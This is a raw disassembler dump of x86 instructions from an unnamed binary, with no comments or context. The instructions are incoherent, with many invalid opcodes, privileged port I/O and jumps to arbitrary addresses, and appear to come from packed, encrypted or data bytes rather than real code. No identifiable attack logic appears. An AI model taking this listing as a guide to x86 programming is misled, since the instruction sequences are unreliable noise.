  41df1c:	jno    0x41df39
  41df1e:	data16 rol dh,0xa2
  41df22:	mov    dl,BYTE PTR [eax]
  41df24:	in     al,0x9e
  41df26:	in     al,0x38
  41df28:	push   ecx
  41df29:	lahf   
  41df2a:	sar    eax,0x6d
  41df2d:	push   edi
  41df2e:	ins    DWORD PTR es:[edi],dx
  41df2f:	adc    DWORD PTR ds:0x5bb5674e,ecx
  41df35:	int3   
  41df36:	dec    ecx
  41df37:	lea    esp,[edi+ebp*4+0x27]
  41df3b:	mov    dh,0xb3
  41df3e:	pop    ebp
  41df3f:	das    
  41df40:	xchg   esp,eax
  41df41:	clc    
  41df42:	pop    ss
  41df43:	ror    BYTE PTR [eax],1
  41df45:	add    bl,ch
  41df47:	cmp    ch,ah
  41df49:	mov    ebx,cs
  41df4b:	cmc    
  41df4c:	mov    dh,bl
  41df4e:	push   0xffffffd1
  41df50:	jnp    0x41df8d
  41df52:	test   eax,0x4253ee8d
  41df57:	mov    ebx,0x6e191c39
  41df5c:	and    al,0xc7
  41df5e:	sub    esp,DWORD PTR es:[ecx]
  41df61:	sub    DWORD PTR [edi],eax
  41df63:	loopne 0x41dfad
  41df65:	int    0x4f
  41df67:	ja     0x41dfc1
  41df69:	cmc    
  41df6a:	ss es dec esi
  41df6d:	rcl    edi,cl
  41df6f:	loopne 0x41df51
  41df71:	jl     0x41dfcf
  41df73:	xor    eax,0x2f76b822
  41df78:	jg     0x41dfb8
  41df7a:	jno    0x41df8f
  41df7c:	lds    ebp,FWORD PTR [ebp+0x47]
  41df7f:	test   eax,0x77400068
  41df84:	ins    BYTE PTR es:[edi],dx
  41df85:	inc    edx
  41df86:	inc    edx
  41df87:	mov    eax,0xd5bc46e3
  41df8c:	aam    0xb3
  41df8e:	sahf   
  41df8f:	in     al,dx
  41df90:	mov    cl,0x6
  41df92:	xor    al,0xe7
  41df94:	mov    eax,ds:0x42498024
  41df99:	in     eax,dx
  41df9a:	sub    eax,0x58127ad9
  41df9f:	pop    ebx
  41dfa0:	push   esi
  41dfa1:	jp     0x41dfc7
  41dfa3:	add    ecx,DWORD PTR [edx+0x23fb5694]
  41dfa9:	add    al,BYTE PTR [ecx-0xa2178c6]
  41dfaf:	mov    ebp,0x6079ef48
  41dfb4:	dec    ecx
  41dfb5:	ficom  DWORD PTR [ecx+ebx*8-0x5e]
  41dfb9:	mov    cx,0xd5ed
  41dfbd:	xchg   edi,eax
  41dfbe:	pop    ebx
  41dfbf:	imul   ecx,DWORD PTR [edi],0xffffffc7
  41dfc2:	test   BYTE PTR [edx-0x34f406f9],al
  41dfc8:	out    0x13,eax
  41dfca:	mov    edi,0xdc54b72c
  41dfcf:	inc    eax
  41dfd0:	xor    edi,DWORD PTR [eax-0x1e]
  41dfd3:	inc    esp
  41dfd4:	mov    edi,0xe32fee53
  41dfd9:	or     edx,0x28
  41dfdc:	dec    esi
  41dfdd:	cmp    ebx,esp
  41dfdf:	or     BYTE PTR [ebp-0x1e99c122],bl
  41dfe5:	inc    esp
  41dfe6:	or     BYTE PTR [eax],ah
  41dfe8:	rcl    DWORD PTR [edx-0x24],cl
  41dfeb:	nop
  41dfec:	in     al,0x3d
  41dfee:	xlat   BYTE PTR ds:[ebx]
  41dfef:	(bad)  
  41dff0:	xchg   ebp,eax
  41dff1:	mov    DWORD PTR [ebx+0x79],edx
  41dff4:	jecxz  0x41df98
  41dff6:	je     0x41dfae
  41dff8:	test   eax,0xd460a9de
  41dffd:	test   DWORD PTR [edi-0xdc094fb],esi
  41e003:	sbb    eax,0xd9334d49
  41e008:	xchg   ecx,eax
  41e009:	rcr    DWORD PTR [eax],0xa6
  41e00c:	sbb    bh,BYTE PTR ds:0x61b400a9
  41e012:	ds add ebp,esi
  41e015:	mov    ah,0x37
  41e017:	jae    0x41e087
  41e019:	mov    DWORD PTR [edi+ecx*2],eax
  41e01c:	xchg   ebp,eax
  41e01d:	xchg   esp,eax
  41e01e:	repnz inc edx
  41e020:	outs   dx,DWORD PTR ds:[esi]
  41e021:	test   eax,0xfbd9f682
  41e026:	sbb    bh,BYTE PTR [edx]
  41e028:	fisubr DWORD PTR [edi]
  41e02a:	mov    eax,0x643f523f
  41e02f:	push   ss
  41e030:	xor    cl,bl
  41e032:	fcomip st,st(1)
  41e034:	adc    eax,0x523d62d3
  41e039:	pusha  
  41e03a:	push   0x74
  41e03c:	sub    DWORD PTR [edx+0x19],esp
  41e03f:	dec    BYTE PTR [esi+0x4b]
  41e042:	push   0x3367505e
  41e047:	cmp    eax,0xf6460703
  41e04c:	es in  eax,0xe5
  41e04f:	mov    edx,0xd4d597ce
  41e054:	dec    edi
  41e055:	retf   
  41e056:	(bad)  
  41e057:	out    0x65,al
  41e059:	pop    esi
  41e05a:	js     0x41e0a5
  41e05c:	xchg   esi,eax
  41e05d:	and    al,0xe
  41e05f:	repz pushf 
  41e061:	stc    
  41e062:	push   edi
  41e063:	adc    BYTE PTR [edx+0x68],cl
  41e066:	pop    ebx
  41e067:	jne    0x41e0b7
  41e069:	popf   
  41e06a:	loop   0x41e0d7
  41e06c:	push   esi
  41e06d:	or     BYTE PTR [edx+0x41],bl
  41e070:	xor    ah,BYTE PTR [edi]
  41e072:	mov    bh,0x47
  41e074:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e075:	mov    eax,0x8df11315
  41e07a:	int    0xce
  41e07c:	push   esi
  41e07d:	int    0xd7
  41e07f:	mov    edi,0x7d5b9a05
  41e084:	push   0x1cdc1e17
  41e089:	(bad)  
  41e08a:	jb     0x41e029
  41e08c:	xchg   esp,eax
  41e08d:	enter  0x2b5f,0x22
  41e091:	mov    dh,0x5d
  41e093:	and    eax,0x6dc80b3
  41e098:	dec    esp
  41e099:	xchg   esp,eax
  41e09a:	mov    ebx,0x5cd4e267
  41e09f:	bound  esi,QWORD PTR [esi]
  41e0a1:	mov    dh,0x8
  41e0a3:	pop    ecx
  41e0a4:	xchg   esp,eax
  41e0a5:	fwait
  41e0a6:	ret    
  41e0a7:	addps  xmm5,XMMWORD PTR [ebx]
  41e0aa:	or     BYTE PTR [ecx],bl
  41e0ac:	sbb    eax,0x3b2a8fbf
  41e0b1:	hlt    
  41e0b2:	cwde   
  41e0b3:	stc    
  41e0b4:	push   ds
  41e0b5:	add    DWORD PTR [eax+0x36ccfbbe],esp
  41e0bb:	xor    ah,BYTE PTR [edx]
  41e0bd:	out    0x58,eax
  41e0bf:	in     al,dx
  41e0c0:	daa    
  41e0c1:	test   BYTE PTR [ebp-0x4e15e6e8],ch
  41e0c7:	sub    al,0xf1
  41e0c9:	jge    0x41e06b
  41e0cb:	ss jbe 0x41e0f4
  41e0ce:	out    dx,al
  41e0cf:	mov    ebx,DWORD PTR [esi]
  41e0d1:	jmp    0x41e14e
  41e0d3:	jne    0x41e063
  41e0d5:	clc    
  41e0d6:	mov    WORD PTR [edi-0x260a4ec5],?
  41e0dc:	jo     0x41e15c
  41e0de:	lock loope 0x41e130
  41e0e1:	iret   
  41e0e2:	jo     0x41e0aa
  41e0e4:	xchg   edx,eax
  41e0e5:	inc    ecx
  41e0e6:	push   ebp
  41e0e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e0e8:	mov    dh,0x26
  41e0ea:	dec    eax
  41e0eb:	out    0x9a,al
  41e0ed:	jge    0x41e099
  41e0ef:	inc    esp
  41e0f0:	xchg   ebp,eax
  41e0f1:	mov    ah,0x1d
  41e0f3:	mov    al,0xd7
  41e0f5:	rol    edx,0x3d
  41e0f8:	dec    ecx
  41e0f9:	test   al,0xbf
  41e0fb:	pop    esi
  41e0fc:	and    ch,bl
  41e0fe:	cmp    esp,DWORD PTR [eax+ecx*4]
  41e101:	jbe    0x41e0fb
  41e103:	retf   
  41e104:	push   ss
  41e105:	jne    0x41e172
  41e107:	sub    ebp,DWORD PTR [edx-0x7892faf7]
  41e10d:	pop    ebp
  41e10e:	mov    ebp,0x66a5635f
  41e113:	pusha  
  41e114:	popf   
  41e115:	dec    edx
  41e116:	and    bh,BYTE PTR [esi+0x3a]
  41e119:	or     eax,0x35d37d26
  41e11e:	cwde   
  41e11f:	cmc    
  41e120:	std    
  41e121:	jns    0x41e0c2
  41e123:	push   es
  41e124:	xor    eax,DWORD PTR [ecx]
  41e126:	sub    DWORD PTR [eax+0x7c],0x2b
  41e12a:	push   cs
  41e12b:	mov    esp,0x9c4c68c9
  41e130:	and    DWORD PTR [edi+0x6d6d2cdf],ecx
  41e136:	(bad)  
  41e138:	pusha  
  41e139:	test   al,0xae
  41e13b:	das    
  41e13c:	mov    dh,0xcb
  41e13e:	dec    esp
  41e13f:	jg     0x41e0df
  41e141:	push   cs
  41e142:	mov    esi,0xf9e4956f
  41e147:	jge    0x41e174
  41e149:	sub    cl,BYTE PTR [eax+0x15]
  41e14c:	rcl    DWORD PTR [eax+0x6c],0xa2
  41e150:	add    ebp,ebx
  41e152:	xchg   DWORD PTR [edx],ebx
  41e154:	jb     0x41e158
  41e156:	or     eax,ecx
  41e158:	xor    edi,DWORD PTR [edx-0x60]
  41e15b:	ss add dl,ah
  41e15e:	fs cmp eax,0x46a98987
  41e164:	lds    eax,FWORD PTR [edx+0x2f]
  41e167:	fnstcw WORD PTR [eax-0x68]
  41e16a:	fs jecxz 0x41e19f
  41e16d:	adc    DWORD PTR [ebp-0x2ca6d622],esp
  41e173:	or     DWORD PTR [eax+0x9955f05],0x65dff7e8
  41e17d:	shl    DWORD PTR [eax+0x40],0x7
  41e181:	pop    ds
  41e182:	push   ebx
  41e183:	inc    eax
  41e184:	and    DWORD PTR [edx-0x45367399],0xa157bdde
  41e18e:	(bad)  
  41e18f:	arpl   WORD PTR [ecx+0xe0d48ef],bx
  41e195:	test   eax,0xc2e32976
  41e19a:	xchg   BYTE PTR [esi+ebp*1-0x23934ea5],dl
  41e1a1:	add    edi,edi
  41e1a3:	add    eax,0x94ffdc3c
  41e1a8:	cs push 0x294a721
  41e1ae:	mov    WORD PTR [edi-0x52],?
  41e1b1:	and    al,0xca
  41e1b3:	cmp    eax,0x5717ec44
  41e1b8:	pop    edx
  41e1b9:	dec    esp
  41e1ba:	and    eax,0x36fef63c
  41e1bf:	mov    cs,WORD PTR [eax]
  41e1c1:	mov    ds:0xf0c05dca,al
  41e1c6:	mov    ecx,0xaea13e77
  41e1cb:	push   es
  41e1cc:	or     DWORD PTR [eax],ebx
  41e1ce:	mov    ebx,0x1f6d98a3
  41e1d3:	sbb    al,0x26
  41e1d5:	push   edi
  41e1d6:	out    0x84,eax
  41e1d8:	dec    eax
  41e1d9:	aaa    
  41e1da:	retf   0xb77
  41e1dd:	jns    0x41e21c
  41e1df:	jb     0x41e22e
  41e1e1:	mov    al,ds:0xcee4a88b
  41e1e6:	popf   
  41e1e7:	adc    eax,0x923891a6
  41e1ec:	and    ch,BYTE PTR [ebx+esi*2]
  41e1ef:	sti    
  41e1f0:	or     al,0xbd
  41e1f2:	test   eax,0xad6bc654
  41e1f7:	mov    ch,0xdc
  41e1f9:	int3   
  41e1fa:	add    BYTE PTR [ebp+0x79],cl
  41e1fd:	aad    0xf7
  41e1ff:	repz xor eax,0x62111beb
  41e205:	jg     0x41e1f1
  41e207:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e208:	retf   0x65ff
  41e20b:	jo     0x41e1eb
  41e20d:	adc    ch,dh
  41e20f:	call   0x121e:0x2150b71b
  41e216:	in     al,dx
  41e217:	fucomp st(0)
  41e219:	in     eax,0x8f
  41e21b:	ins    BYTE PTR es:[edi],dx
  41e21c:	lock test al,0x6a
  41e220:	sbb    DWORD PTR ds:0x9e6b2d33,esi
  41e226:	lock xor BYTE PTR [ebp+0x68f0c77b],0xb3
  41e22e:	sub    DWORD PTR [edi+edx*4+0x7f982f3a],edx
  41e235:	jne    0x41e1ef
  41e237:	inc    ecx
  41e238:	or     eax,0x5a0f3983
  41e23d:	xchg   edx,ebp
  41e23f:	data16 jl 0x41e2ba
  41e242:	fnstenv [edx+0x9]
  41e245:	push   esi
  41e246:	mov    eax,esi
  41e248:	inc    eax
  41e249:	push   edx
  41e24a:	lock retf 
  41e24c:	ins    DWORD PTR es:[edi],dx
  41e24d:	mov    ah,ch
  41e24f:	or     edx,DWORD PTR [ebp+0x545f5ee]
  41e255:	int    0x1f
  41e257:	into   
  41e258:	inc    ecx
  41e259:	aad    0x63
  41e25b:	mov    ebp,DWORD PTR [edi]
  41e25d:	and    al,0x70
  41e25f:	mov    eax,ds:0x86c1adc7
  41e264:	stos   BYTE PTR es:[edi],al
  41e265:	xor    al,0xf6
  41e267:	add    BYTE PTR [ebp+0x2b],dl
  41e26a:	add    DWORD PTR [esp+eax*8+0x67],ebp
  41e26e:	jmp    0x41e274
  41e270:	add    DWORD PTR [ebp-0x4a796503],edi
  41e276:	fadd   QWORD PTR [eax-0x29]
  41e279:	mov    ebx,0x62335575
  41e27e:	and    BYTE PTR [esp+ebp*8],bh
  41e281:	jnp    0x41e2de
  41e283:	sub    ebx,DWORD PTR ds:0xa51f16d7
  41e289:	rol    ebp,1
  41e28b:	fnstenv [ebx+0x3e]
  41e28e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e28f:	and    DWORD PTR [ebx-0x321c460],esi
  41e295:	fstp   DWORD PTR [ebp+0x3c95103f]
  41e29b:	pop    ecx
  41e29c:	inc    ebx
  41e29d:	ja     0x41e27b
  41e29f:	cld    
  41e2a0:	or     eax,0x4b8e117e
  41e2a5:	and    BYTE PTR ds:0x53cc17c7,dh
  41e2ab:	outs   dx,DWORD PTR ds:[esi]
  41e2ac:	fwait
  41e2ad:	clc    
  41e2ae:	add    cl,BYTE PTR [edi]
  41e2b0:	jne    0x41e2b4
  41e2b2:	push   edi
  41e2b3:	rol    DWORD PTR [ecx+0x1b],1
  41e2b6:	rcr    DWORD PTR [ebp-0x13],1
  41e2b9:	inc    eax
  41e2ba:	sub    al,0x63
  41e2bc:	mov    ds,WORD PTR [ecx-0x12]
  41e2bf:	jae    0x41e30e
  41e2c1:	test   eax,0xba626f4e
  41e2c6:	cmp    eax,DWORD PTR [edi]
  41e2c8:	(bad)  
  41e2c9:	gs inc ebp
  41e2cb:	daa    
  41e2cc:	push   ss
  41e2cd:	mov    ds:0xdf8ccc11,al
  41e2d2:	retf   
  41e2d3:	ins    DWORD PTR es:[edi],dx
  41e2d4:	cmc    
  41e2d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e2d6:	sbb    esi,DWORD PTR [edi-0x11]
  41e2d9:	xchg   ecx,eax
  41e2da:	adc    eax,0x4afe5e19
  41e2df:	imul   ecx,DWORD PTR [ebx+0x3a8d8ef4],0xffffffe1
  41e2e6:	lahf   
  41e2e7:	rol    DWORD PTR [ebp-0x38eb769c],1
  41e2ed:	js     0x41e2d3
  41e2ef:	lea    esi,[ecx+ebx*8]
  41e2f2:	call   0x3a8f863c
  41e2f7:	jae    0x41e34e
  41e2f9:	popf   
  41e2fa:	cs dec esp
  41e2fc:	mov    bl,BYTE PTR [ebp-0x3e]
  41e2ff:	sub    eax,0x22294711
  41e304:	iret   
  41e305:	xchg   ecx,eax
  41e306:	sti    
  41e307:	ja     0x41e30c
  41e309:	and    al,0x89
  41e30b:	sar    DWORD PTR [edx+esi*8-0x14],cl
  41e30f:	jmp    0xf594b7ab
  41e314:	jae    0x41e2c0
  41e316:	cmp    eax,0x93cf9b8f
  41e31b:	pop    ds
  41e31c:	mov    eax,0x5401237d
  41e321:	push   ds
  41e322:	or     BYTE PTR [ecx],ch
  41e324:	push   0xfffffffe
  41e326:	out    0x96,eax
  41e328:	push   ebp
  41e329:	add    eax,DWORD PTR [edx-0x6c]
  41e32c:	in     eax,dx
  41e32d:	xchg   edi,eax
  41e32e:	das    
  41e32f:	test   al,0xa4
  41e331:	enter  0xd028,0xa1
  41e335:	je     0x41e364
  41e337:	(bad)  
  41e338:	sub    eax,0x55c3eba6
  41e33d:	jp     0x41e392
  41e33f:	push   es
  41e340:	rcl    BYTE PTR [edx-0x11],1
  41e343:	sahf   
  41e344:	aam    0x8e
  41e346:	ret    
  41e347:	jle    0x41e334
  41e349:	push   es
  41e34a:	add    ch,ah
  41e34c:	icebp  
  41e34d:	xor    dh,bh
  41e34f:	lds    edx,FWORD PTR [ebp+0x30bc5c2]
  41e355:	fcom   DWORD PTR [ecx-0x36]
  41e358:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e359:	push   cs
  41e35a:	jge    0x41e3aa
  41e35c:	lea    ebp,[ebx+0xc]
  41e35f:	xor    bh,BYTE PTR [ecx+0x2dd126ee]
  41e365:	int3   
  41e366:	fisttp DWORD PTR [ebx-0x41]
  41e369:	shr    DWORD PTR [esi+0x4c77da45],1
  41e36f:	gs nop
  41e371:	inc    edi
  41e372:	hlt    
  41e373:	push   edi
  41e374:	imul   ebx,DWORD PTR [eax-0x53a07fe2],0xffffffe7
  41e37b:	jb     0x41e369
  41e37d:	out    0x19,ax
  41e380:	mov    ecx,0xf783d150
  41e385:	bswap  eax
  41e387:	in     al,dx
  41e388:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e389:	out    dx,al
  41e38a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e38b:	ss or  eax,0x175a7ff4
  41e391:	sub    edx,DWORD PTR [edx]
  41e393:	pop    ecx
  41e394:	xchg   esp,eax
  41e395:	and    dl,BYTE PTR [edi]
  41e397:	ins    DWORD PTR es:[edi],dx
  41e398:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e399:	and    dl,BYTE PTR [edx+0xc489faf]
  41e39f:	adc    al,0x52
  41e3a1:	dec    DWORD PTR [ecx]
  41e3a3:	aam    0x5a
  41e3a5:	int3   
  41e3a6:	rcl    BYTE PTR [edx],cl
  41e3a8:	mov    eax,ebp
  41e3aa:	adc    al,0x33
  41e3ac:	aad    0x80
  41e3ae:	mov    ecx,0x2bd8c265
  41e3b3:	sub    ebx,ecx
  41e3b5:	push   ss
  41e3b6:	ins    DWORD PTR es:[edi],dx
  41e3b7:	test   BYTE PTR [eax],dl
  41e3b9:	shl    BYTE PTR [esi+0x4baba0c8],cl
  41e3bf:	jmp    0x41e43e
  41e3c1:	push   edx
  41e3c2:	jmp    0x6ce9:0xb5629dbc
  41e3c9:	ins    DWORD PTR es:[edi],dx
  41e3ca:	jecxz  0x41e417
  41e3cc:	cmp    al,0xc6
  41e3ce:	push   esp
  41e3cf:	es xchg ah,cl
  41e3d2:	sbb    edi,DWORD PTR [ebp+eax*2-0xd]
  41e3d6:	out    dx,eax
  41e3d7:	aad    0x8a
  41e3d9:	ficom  DWORD PTR [esi-0x9c9e035]
  41e3df:	add    BYTE PTR [ebx+0x4c4be66f],bl
  41e3e5:	mov    al,ds:0x6a9f1e36
  41e3ea:	inc    ebx
  41e3eb:	cwde   
  41e3ec:	test   eax,0xc9d96563
  41e3f1:	lds    esp,FWORD PTR [eax+0x2a]
  41e3f4:	mov    esi,0x263b3121
  41e3f9:	std    
  41e3fa:	aam    0x52
  41e3fc:	dec    eax
  41e3fd:	fstp   TBYTE PTR ds:0xd45aac3e
  41e403:	dec    edi
  41e404:	sti    
  41e405:	inc    eax
  41e406:	sbb    ch,BYTE PTR [ecx-0x38]
  41e409:	sbb    DWORD PTR [ebx],esp
  41e40b:	sub    DWORD PTR [eax],0x13822104
  41e411:	mov    al,0x8d
  41e413:	sub    eax,0x8bb66461
  41e418:	lods   eax,DWORD PTR ds:[esi]
  41e419:	xor    dl,BYTE PTR [eax]
  41e41b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e41c:	and    edi,DWORD PTR [ebx+0x44]
  41e41f:	imul   eax,esi,0x304100a
  41e425:	cmp    ebx,0x29
  41e428:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e429:	fsubr  DWORD PTR [ebp-0x5e1818c9]
  41e42f:	adc    DWORD PTR [edx],ebp
  41e431:	adc    cl,dl
  41e433:	inc    eax
  41e434:	or     ah,BYTE PTR [ecx]
  41e436:	push   es
  41e437:	mov    esi,0xa0a23ca7
  41e43c:	or     esi,edi
  41e43e:	popa   
  41e43f:	or     eax,0x82e4351a
  41e444:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e445:	push   ecx
  41e446:	add    dl,BYTE PTR [eax+eax*4+0x45]
  41e44a:	mov    ebx,0xc6427676
  41e44f:	jg     0x41e4c8
  41e451:	adc    esp,DWORD PTR [ebx]
  41e453:	addr16 inc edi
  41e455:	(bad)  
  41e456:	fs mov eax,0xbc3a9e02
  41e45c:	xchg   edx,eax
  41e45d:	mov    eax,ds:0xe19ffa28
  41e462:	rcl    BYTE PTR [edx+0x72],0x6a
  41e466:	mov    ecx,0xc0746070
  41e46b:	sbb    BYTE PTR [edx-0x325ea679],ah
  41e471:	and    ch,ah
  41e473:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e474:	adc    eax,0xd841f9e1
  41e479:	dec    ebx
  41e47a:	cs in  eax,0x40
  41e47d:	fstp   DWORD PTR [esi+0x556c404f]
  41e483:	in     eax,0xb8
  41e485:	or     al,0x68
  41e487:	cdq    
  41e488:	into   
  41e489:	in     eax,dx
  41e48a:	(bad)  
  41e48b:	stos   DWORD PTR es:[edi],eax
  41e48c:	into   
  41e48d:	ret    
  41e48e:	test   eax,0xdd4f6340
  41e493:	add    dl,BYTE PTR [edx-0x3b]
  41e496:	daa    
  41e497:	hlt    
  41e498:	into   
  41e499:	add    edx,DWORD PTR [edx+0x4a]
  41e49c:	and    ah,BYTE PTR [ebx+0x748f0b19]
  41e4a2:	(bad)  [ebp+0x2d]
  41e4a5:	outs   dx,BYTE PTR ds:[esi]
  41e4a6:	pop    ebx
  41e4a7:	push   ss
  41e4a8:	ds in  al,0x2d
  41e4ab:	and    al,0xc9
  41e4ad:	and    edi,DWORD PTR [ebx+0x31]
  41e4b0:	in     eax,dx
  41e4b1:	inc    ebx
  41e4b2:	js     0x41e478
  41e4b4:	sbb    DWORD PTR [ecx],edx
  41e4b6:	mov    edi,0xaa3d14b4
  41e4bb:	or     eax,0x649884d7
  41e4c0:	imul   esp,DWORD PTR [eax+eax*2+0x164815d0],0xe6d3c2b5
  41e4cb:	(bad)  
  41e4cc:	gs inc edx
  41e4ce:	pop    ecx
  41e4cf:	push   ebp
  41e4d0:	inc    edx
  41e4d1:	or     al,0x8
  41e4d3:	sub    esi,ecx
  41e4d5:	sbb    edx,esp
  41e4d7:	and    esp,DWORD PTR [edx]
  41e4d9:	nop
  41e4da:	lea    ebx,[ecx+0xc]
  41e4dd:	aaa    
  41e4de:	rcl    esp,cl
  41e4e0:	(bad)  
  41e4e1:	sbb    eax,0x49f58499
  41e4e6:	pop    ebp
  41e4e7:	test   dh,bl
  41e4e9:	and    dh,0xbf
  41e4ec:	mov    WORD PTR [eax+ebp*8-0x4b],?
  41e4f0:	sbb    dh,BYTE PTR [esi+0x74]
  41e4f3:	xchg   ebx,eax
  41e4f4:	fmul   DWORD PTR [edi-0x43]
  41e4f7:	lods   eax,DWORD PTR ds:[esi]
  41e4f8:	test   DWORD PTR [eax],0xe1d96b18
  41e4fe:	jae    0x41e57e
  41e500:	(bad)  
  41e501:	(bad)  
  41e502:	stc    
  41e503:	jo     0x41e488
  41e505:	dec    ebx
  41e506:	cmp    dl,BYTE PTR [ecx+0x54]
  41e509:	pop    edi
  41e50a:	stos   BYTE PTR es:[edi],al
  41e50b:	lock clc 
  41e50d:	lds    edi,FWORD PTR [ecx-0x72]
  41e510:	fstp   DWORD PTR [ebx+0x5dad79b2]
  41e516:	pop    ecx
  41e517:	sar    esi,cl
  41e519:	mov    cl,0xd3
  41e51b:	test   BYTE PTR [esi],bl
  41e51d:	xchg   ecx,eax
  41e51e:	cwde   
  41e51f:	push   cs
  41e520:	mov    dl,0x2e
  41e522:	outs   dx,DWORD PTR ds:[esi]
  41e523:	dec    eax
  41e524:	or     dh,BYTE PTR [eax]
  41e526:	(bad)  
  41e527:	mov    ebx,0xad09dcf9
  41e52c:	jmp    FWORD PTR [eax-0x5d]
  41e52f:	sar    ebp,0x86
  41e532:	sbb    edx,DWORD PTR [ebx+ecx*2-0xc]
  41e536:	push   esi
  41e537:	jmp    0x5517c88b
  41e53c:	inc    ecx
  41e53d:	adc    eax,DWORD PTR [ecx]
  41e53f:	mov    edx,0x14c99d01
  41e544:	ret    
  41e545:	xchg   ebp,eax
  41e546:	pop    esi
  41e547:	ret    0x5a85
  41e54a:	mov    DWORD PTR [edx+0x78dd387],edx
  41e550:	xchg   sp,ax
  41e552:	iret   
  41e553:	jo     0x41e4f5
  41e555:	and    eax,0x7c3bd472
  41e55a:	inc    ebx
  41e55b:	fs ins BYTE PTR es:[edi],dx
  41e55d:	daa    
  41e55e:	push   ecx
  41e55f:	push   es
  41e560:	ins    DWORD PTR es:[edi],dx
  41e561:	imul   edi,ebx,0x12
  41e564:	push   0xffffffc1
  41e566:	jp     0x41e560
  41e568:	push   ecx
  41e569:	not    BYTE PTR [eax+esi*4-0x2cabec9d]
  41e570:	hlt    
  41e571:	(bad)  
  41e572:	in     al,0x8c
  41e574:	out    dx,al
  41e575:	pop    ds
  41e576:	xor    edx,DWORD PTR [ebx-0x37]
  41e579:	lods   eax,DWORD PTR ds:[esi]
  41e57a:	jecxz  0x41e58a
  41e57c:	dec    esi
  41e57d:	lods   eax,DWORD PTR ds:[esi]
  41e57e:	ins    BYTE PTR es:[edi],dx
  41e57f:	fs js  0x41e5e3
  41e582:	lods   eax,DWORD PTR ds:[esi]
  41e583:	(bad)  
  41e584:	jge    0x41e50a
  41e586:	outs   dx,DWORD PTR ds:[esi]
  41e587:	xor    BYTE PTR [ebx*1+0x1f83df8c],ah
  41e58e:	mov    eax,ds:0xadfe8db1
  41e593:	(bad)  
  41e594:	nop
  41e595:	enter  0xfab6,0x81
  41e599:	xchg   esp,eax
  41e59a:	mov    ah,0xb3
  41e59c:	dec    ebx
  41e59d:	pop    ebx
  41e59e:	(bad)  
  41e59f:	dec    esi
  41e5a0:	test   BYTE PTR [eax-0x2c],0xfe
  41e5a4:	imul   esi,ebp,0x926bb4
  41e5aa:	or     DWORD PTR [edx],ecx
  41e5ac:	mov    bl,0xab
  41e5ae:	fidivr WORD PTR [esi+eiz*8]
  41e5b1:	std    
  41e5b2:	pop    edx
  41e5b3:	lock xor BYTE PTR [edi],al
  41e5b6:	loope  0x41e5d6
  41e5b8:	je     0x41e5c2
  41e5ba:	jl     0x41e5cd
  41e5bc:	push   ebp
  41e5bd:	fdiv   st,st(4)
  41e5bf:	mov    WORD PTR [edi-0x32],?
  41e5c2:	xchg   esp,eax
  41e5c3:	adc    bl,BYTE PTR [ebx]
  41e5c5:	mov    ah,bl
  41e5c7:	(bad)  
  41e5c9:	mov    esi,0x8676cffe
  41e5ce:	and    bl,0xbc
  41e5d1:	(bad)  
  41e5d2:	and    edi,DWORD PTR [esi+edi*8+0x58]
  41e5d6:	sbb    BYTE PTR [edx-0x3e],cl
  41e5d9:	jb     0x41e56a
  41e5db:	mov    ds:0x28b00ed4,al
  41e5e0:	mov    ah,0xff
  41e5e2:	rcr    DWORD PTR [ebp-0x57],0xf9
  41e5e6:	cmp    eax,0x4973a91d
  41e5eb:	sbb    DWORD PTR [ebx],ecx
  41e5ed:	retf   0xfb0e
  41e5f0:	sbb    al,0xeb
  41e5f2:	push   eax
  41e5f3:	fwait
  41e5f4:	mov    dh,0xdd
  41e5f6:	mov    edx,0xea69006e
  41e5fb:	and    al,0xe5
  41e5fd:	imul   ch
  41e5ff:	sub    ecx,ecx
  41e601:	push   ss
  41e602:	test   eax,0x7bae267a
  41e607:	mov    cl,BYTE PTR [esi]
  41e609:	sub    al,0x5a
  41e60b:	outs   dx,BYTE PTR ds:[esi]
  41e60c:	jo     0x41e605
  41e60e:	(bad)  
  41e60f:	bound  edi,QWORD PTR [edi]
  41e611:	jg     0x41e5ab
  41e613:	adc    eax,0xa9e8904c
  41e618:	and    ecx,DWORD PTR [ebx-0x40]
  41e61b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e61c:	sub    al,BYTE PTR [esi-0x48]
  41e61f:	sbb    DWORD PTR [esi+0x3b],esi
  41e622:	jmp    0x40bc37d4
  41e627:	ret    
  41e628:	cmp    DWORD PTR [edi+ebx*4-0x2f],eax
  41e62c:	push   esp
  41e62d:	fwait
  41e62e:	mov    al,0x7b
  41e630:	leave  
  41e631:	das    
  41e632:	es cmc 
  41e634:	dec    esp
  41e635:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e636:	dec    ebx
  41e637:	mov    edi,fs
  41e639:	out    dx,eax
  41e63a:	jae    0x41e5ea
  41e63c:	mov    ecx,0xc66ab5c5
  41e641:	mov    ch,0x41
  41e643:	xchg   edx,eax
  41e644:	test   BYTE PTR [eax],al
  41e646:	mov    dl,0x1e
  41e648:	adc    edi,DWORD PTR [eax-0xcb44c62]
  41e64e:	inc    eax
  41e64f:	mov    al,0x67
  41e651:	cmp    esp,edi
  41e653:	ret    0xcbd4
  41e656:	push   esi
  41e657:	xlat   BYTE PTR ds:[ebx]
  41e658:	jb     0x41e663
  41e65a:	add    ch,BYTE PTR [ecx]
  41e65c:	mov    eax,ds:0x25f61c9
  41e661:	inc    esi
  41e662:	push   ecx
  41e663:	mov    al,0x8
  41e665:	cmp    bh,BYTE PTR [esi]
  41e667:	dec    ebx
  41e668:	call   0x96e5:0x86837e08
  41e66f:	jmp    0x1fb69f12
  41e674:	add    al,ch
  41e676:	(bad)  
  41e677:	mov    ah,0xce
  41e679:	xchg   ebp,eax
  41e67a:	clc    
  41e67b:	sbb    eax,esi
